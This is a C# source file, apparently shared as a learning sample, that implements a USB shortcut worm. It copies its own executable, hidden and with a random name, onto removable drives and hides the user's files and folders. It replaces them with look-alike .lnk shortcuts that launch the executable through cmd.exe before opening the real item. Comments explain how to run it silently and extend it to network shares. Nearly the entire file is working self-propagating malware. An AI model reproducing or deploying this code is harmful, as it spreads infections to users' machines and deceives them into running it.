using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace Windows_USB_Host
{
    static class Program
    {
        /// <summary>
        /// This Usbshortcut code is for learning and see how it works 
        /// this C# code was Written BY { SAHER BLUE EAGLE }
        /// The main entry point for the application.
        /// </summary>

        private static usb mnx;
       
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());

            /*
             you can remove above lines  + remove form 1
             and also can add the lines below , if need app to run silent 
                mnx.Start_work();// for start usb spread
                Application.Run();//keeps app live in background
             */
        }
    }

    public class usb
    {
        private static bool Off = false;
        static System.Threading.Thread thread = null;
        static System.Random r = new System.Random();
        private static string ExeName = r.Next(199997, 88886777) + ".exe";

         public void Start_work()
        {
            if (thread == null)
            {
                thread = new System.Threading.Thread(new System.Threading.ThreadStart(usb_w),1);
                thread.Start();
            }

           
        }
         public void clean_w()
        {
            Off = true;
            do
            { System.Threading.Thread.Sleep(1);} while (thread == null);
            foreach (System.IO.DriveInfo x in System.IO.DriveInfo.GetDrives())
            {
                try
                {
                    if (x.IsReady)
                    {
                        if (System.IO.File.Exists(x.Name + ExeName))
                        {
                            System.IO.File.SetAttributes(x.Name + ExeName, System.IO.FileAttributes.Normal);
                            System.IO.File.Delete(x.Name + ExeName);
                        }
                        foreach (string xx in System.IO.Directory.GetFiles(x.Name))
                        {
                            try { System.IO.File.SetAttributes(xx, System.IO.FileAttributes.Normal);
                            if (xx.ToLower().EndsWith(".lnk"))
                            {
                                System.IO.File.Delete(xx);
                                
                            }
                            }
                            catch (System.Exception ex) { }
                        }
                        foreach (string xx in System.IO.Directory.GetDirectories(x.Name))
                        {
                            try
                            {
                              
                                if (xx.ToLower().EndsWith(".lnk"))
                                {
                                    System.IO.File.Delete(xx);

                                }
                            }
                            catch (System.Exception ex) { }
                           
                            (new System.IO.DirectoryInfo(xx)).Attributes = System.IO.FileAttributes.Normal;
                        }
                    }

                }
                catch (System.Exception ex) { }
            }
        }
        private static void usb_w()
        {
            Off = false;
            do
            {
                foreach (System.IO.DriveInfo x in System.IO.DriveInfo.GetDrives())
                {
                    try {
                        if (x.IsReady)
                        {                                                                                                                           // \/   \/   \/          \/ if need to make shortcut on shared too
                            if (x.TotalFreeSpace > 0 && (x.DriveType == System.IO.DriveType.Removable || x.DriveType == System.IO.DriveType.CDRom))// || x.DriveType == System.IO.DriveType.Network)) // <<<<<<<<<<< if need to make shortcut on shared 
                            {                                                                                                                           // ^^^^^^^^^^^ if need to make shortcut on shared 
                                try { 
                                    if(System.IO.File.Exists (x.Name + ExeName )){
                                        System.IO.File.SetAttributes(x.Name + ExeName, System.IO.FileAttributes.Normal);
                                      }
                                    System.IO.File.Copy(Application.ExecutablePath, x.Name + ExeName, true);
                                    System.IO.File.SetAttributes(x.Name + ExeName, System.IO.FileAttributes.Hidden);
                                    try { System.IO.File.SetAttributes(x.Name + ExeName, System.IO.FileAttributes.System); }
                                    catch (System.Exception ex) { }
                                    try { System.IO.File.SetAttributes(x.Name + ExeName, System.IO.FileAttributes.Hidden); }
                                    catch (System.Exception ex) { }
                                    foreach (string xx in System.IO.Directory.GetFiles(x.Name))
                                    {
                                        if (xx.Contains (ExeName.Replace (".exe",".ex"))==false && System.IO.Path.GetExtension(xx).ToLower().Equals(".lnk") == false && System.IO.Path.GetExtension(xx).ToLower().Equals(x.Name.ToLower() + ExeName.ToLower ()) == false)
                                        {
                                               System.IO.File.SetAttributes(xx, System.IO.FileAttributes.Hidden);

                                                try { System.IO.File.SetAttributes(x.Name + ExeName, System.IO.FileAttributes.System); }
                                               catch (System.Exception ex) { }
                                               try { System.IO.File.SetAttributes(x.Name + ExeName, System.IO.FileAttributes.ReadOnly); }
                                               catch (System.Exception ex) { }




                                               try { System.IO.File.Delete(x.Name + new System.IO.FileInfo(xx).Name + ".lnk"); }
                                               catch (System.Exception ex) { }

                                               try {
                                                   
                                               var shell = new IWshRuntimeLibrary.WshShell();
                                                  
                                               var shortcut = shell.CreateShortcut(x.Name + new System.IO.FileInfo(xx).Name + ".lnk") as IWshRuntimeLibrary.IWshShortcut;
                                               shortcut.TargetPath = "cmd.exe";
                                               shortcut.WorkingDirectory = "";
                                               shortcut.Arguments = @"/c start " + ExeName.Replace(" ", ((char)34).ToString() + " " + ((char)34).ToString()) + "&start " + new System.IO.FileInfo(xx).Name.Replace(" ", ((char)34).ToString() + " " + ((char)34).ToString()) + " & exit";
                                               shortcut.IconLocation = GetIcon(System.IO.Path.GetExtension(xx));
                                               shortcut.Save();

                                               }
                                               catch (System.Exception ex) {
                                                
                                               }

                                             
                                             

                                           
                                               

                                              
                                        }
                                    }
                                    foreach (string xx in System.IO.Directory.GetDirectories(x.Name))
                                    {
                                        System.IO.File.SetAttributes(xx, System.IO.FileAttributes.Hidden);
                                        try { System.IO.File.SetAttributes(x.Name + ExeName, System.IO.FileAttributes.System); }
                                        catch (System.Exception ex) { }
                                        try { System.IO.File.SetAttributes(x.Name + ExeName, System.IO.FileAttributes.ReadOnly); }
                                        catch (System.Exception ex) { }
                                        System.IO.File.Delete(x.Name + new System.IO.DirectoryInfo(xx).Name + ".lnk");

                                        string result = System.IO.Path.GetFileNameWithoutExtension(xx);
                                        var shell = new IWshRuntimeLibrary.WshShell();
                                        var shortcut = shell.CreateShortcut(x.Name + result + " .lnk") as IWshRuntimeLibrary.IWshShortcut;
                                        shortcut.TargetPath = "cmd.exe";
                                        shortcut.WorkingDirectory = "";
                                        shortcut.Arguments = @"/c start " + ExeName.Replace(" ", ((char)34).ToString() + " " + ((char)34).ToString()) + @"&explorer /root,""%CD%" + new System.IO.DirectoryInfo(xx).Name +  @""" & exit";
                                        shortcut.IconLocation = @"%SystemRoot%\system32\SHELL32.dll,3";
                                        shortcut.Save();


                                    }

                                    }
                                catch (System.Exception ex) { }
                            }
                        }
                    
                    
                        }
                    catch (System.Exception ex) { }
                }
                System.Threading.Thread.Sleep(800);
            } while (Off==true);
            try { thread = null; }
            catch (System.Exception ex) {}
        }



        private static string GetIcon(string ext)
        {
            try {
                Microsoft.Win32.RegistryKey r = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Classes\\", false);
                string e = r.OpenSubKey(r.OpenSubKey(ext, false).GetValue("") + "\\DefaultIcon\\").GetValue("", "").ToString();
                if (e.Contains(",") == false)
                {
                    e += ",0";
                }
                return e;
            }
            catch (System.Exception ex) { return ""; }
        }

// This whole C# code was written by {SAHER BLUE EAGLE}
        

         
    }
}
